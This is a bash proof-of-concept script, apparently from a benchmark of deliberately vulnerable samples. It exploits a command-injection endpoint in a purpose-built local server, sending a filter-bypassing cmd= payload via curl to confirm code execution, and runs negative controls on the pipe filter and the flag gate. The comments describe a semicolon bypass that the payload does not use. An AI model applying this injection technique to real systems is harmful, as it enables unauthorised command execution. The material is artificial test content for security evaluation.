#!/usr/bin/env bash
# PoC for 097_onion_C3I1S2
# Axes: C3 (three flags + utility function) / I1 (direct to system()) / S2 (block pipe, bypass semicolon)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# C3: all three flags (--exec-mode, --diag-mode, --allow-exec) must be present.
# S2: pipe (|) is blocked; bypass via semicolon (;) or $().
#
# The patched binary (onion_server) lives in this directory. If absent, run:
#   cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/onion_server"
WWWROOT="/tmp/poc_097_www"
MARKER="/tmp/poc_097_marker"
PORT=18097

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server (all three flags required) ────────────────────────────────────
echo "[*] starting onion_server with --exec-mode --diag-mode --allow-exec on port $PORT..."
"$BINARY" --port "$PORT" --exec-mode --diag-mode --allow-exec --wwwroot "$WWWROOT" &
SERVER_PID=$!
sleep 0.5

# ── trigger ────────────────────────────────────────────────────────────────────
# S2: pipe blocked; semicolon bypass
# I1: cmd goes directly to system()
echo "[*] sending payload: cmd=id>${MARKER}  (semicolon works, pipe blocked)"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control 1: pipe is blocked ────────────────────────────────────────
echo "[*] verifying S2: pipe character must be blocked..."
rm -f "$MARKER"
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${PORT}/exec?cmd=id|tee%20${MARKER}" || true)
if [[ "$HTTP_CODE" == "400" ]]; then
    echo "[+] S2 check passed: pipe blocked with 400"
else
    echo "[!] S2 check unexpected response: $HTTP_CODE"
fi

# ── negative control 2: endpoint absent if any C3 flag is missing ──────────────
echo "[*] verifying C3 gate: endpoint must be absent when --allow-exec is omitted..."
NEG_PORT=19097
"$BINARY" --port "$NEG_PORT" --exec-mode --diag-mode --wwwroot "$WWWROOT" &
SAFE_PID=$!
sleep 0.5
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --allow-exec"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
